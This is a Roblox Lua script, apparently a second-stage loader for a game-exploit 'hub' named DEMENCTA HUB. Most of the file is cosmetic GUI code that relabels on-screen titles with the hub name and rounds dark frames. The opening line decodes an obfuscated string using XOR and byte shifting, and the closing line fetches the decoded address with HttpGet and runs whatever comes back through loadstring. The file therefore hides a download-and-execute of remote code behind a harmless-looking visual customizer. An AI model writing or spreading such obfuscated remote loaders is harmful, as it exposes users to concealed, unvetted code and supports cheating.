
--[[ STAGE 2: VISUAL CORE ]]
local qdejoCgz63JMUT="\009\024\004\201\020\228\023\238\237\244\041\251\019\044\053\073\069\050\049\040\022\255\023\005\032\099\061\093\105\057\073\098\123\097\123\099\091\044\097\144\128\131\127\157\137\137\133\124\139\139\133\180\184\164\190\170\174\199\195\142\163\188\213\198\197\193\203\197\187\230\215\181\151\219\223\234\225\166\232\235\249\010\249\004\253\027\014\196\014\038\014\026\017\028\023\038\032\034\038\232\041\046\061\245\078\059\067\087\068\070\085\105\085\110\107\101\113\097\120\102\111\043\133\122\144\054\057\081\155\157\156\159\142"local bGbWuU4djuNdvS6zbV0=141 local dEMqd8XRAci5D4HDCTAb=21 local HcFbyV7EZDLvP=0 local vHAkQF5AtW_ePu0hVf=3 local IzZ01up_3GyLYoiC=5 local DGJ3YcNWIdQQ_rxDQD=true local r4lxPdp8dl8Q=bit32 and bit32.bxor if not r4lxPdp8dl8Q then r4lxPdp8dl8Q=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local zj_BHl1f5Aiz9XuNM5Vn={}for XVHYEK5kFZN31Dounavid=1,#qdejoCgz63JMUT do local nyjyx2Z1FnYGcpvwSco=string.byte(qdejoCgz63JMUT,XVHYEK5kFZN31Dounavid)local pn3YxP05WygQ4DaX58Wp3J=(dEMqd8XRAci5D4HDCTAb+(XVHYEK5kFZN31Dounavid*vHAkQF5AtW_ePu0hVf)+IzZ01up_3GyLYoiC)%256 if HcFbyV7EZDLvP==0 then nyjyx2Z1FnYGcpvwSco=(nyjyx2Z1FnYGcpvwSco-pn3YxP05WygQ4DaX58Wp3J)%256 zj_BHl1f5Aiz9XuNM5Vn[XVHYEK5kFZN31Dounavid]=string.char(r4lxPdp8dl8Q(nyjyx2Z1FnYGcpvwSco,bGbWuU4djuNdvS6zbV0))else nyjyx2Z1FnYGcpvwSco=r4lxPdp8dl8Q(nyjyx2Z1FnYGcpvwSco,bGbWuU4djuNdvS6zbV0)zj_BHl1f5Aiz9XuNM5Vn[XVHYEK5kFZN31Dounavid]=string.char((nyjyx2Z1FnYGcpvwSco-pn3YxP05WygQ4DaX58Wp3J)%256)end end local TS9QygSmpUvLYZ=table.concat(zj_BHl1f5Aiz9XuNM5Vn)if DGJ3YcNWIdQQ_rxDQD then TS9QygSmpUvLYZ=string.reverse(TS9QygSmpUvLYZ)end local _ONsKDLPRS3XkOEs2=TS9QygSmpUvLYZ
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(_ONsKDLPRS3XkOEs2))()
